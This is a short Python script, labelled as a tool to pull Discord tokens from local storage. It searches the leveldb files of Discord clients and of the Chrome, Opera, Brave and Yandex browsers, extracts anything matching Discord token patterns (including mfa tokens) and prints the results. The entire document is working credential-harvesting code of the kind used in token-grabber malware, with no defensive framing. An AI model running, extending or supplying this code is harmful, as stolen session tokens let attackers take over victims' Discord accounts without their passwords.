# Script to pull discord tokens from various local storage places
import os
import re
import sys
import pathlib

def get_user_data_path():
    home = pathlib.Path.home()
    if sys.platform == "win32":
        return home / "AppData/Roaming"
    elif sys.platform == "linux":
        return home / ".local/share"
    elif sys.platform == "darwin":
        return home / "Library/Application Support"


# set paths to where tokens are stored
localappdata = get_user_data_path()
#os.getenv('LOCALAPPDATA')
#roaming = os.getenv('APPDATA')
roaming = get_user_data_path()
paths = {
    'Discord': os.path.join(roaming, 'Discord'),
    'Discord Canary': os.path.join(roaming, 'DiscordCanary'),
    'Discord PTB': os.path.join(roaming, 'DiscordPTB'),
    'Google Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
    'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
    'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
}

# grab tokens
tokens = []

for platform, path in paths.items():
    path = os.path.join(path, 'Local Storage', 'leveldb')

    if os.path.exists(path) is False:
        continue

    for item in os.listdir(path):
        if not item[-4:] in ('.log', '.ldb'):
            continue

        with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
            lines = file.readlines()

        for line in lines:
            line = line.strip()

            if len(line) == 0:
                continue

            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                if token in tokens:
                    continue

                tokens.append(token)

print("Discord Tokens")
for t in tokens:
    print(t)
    
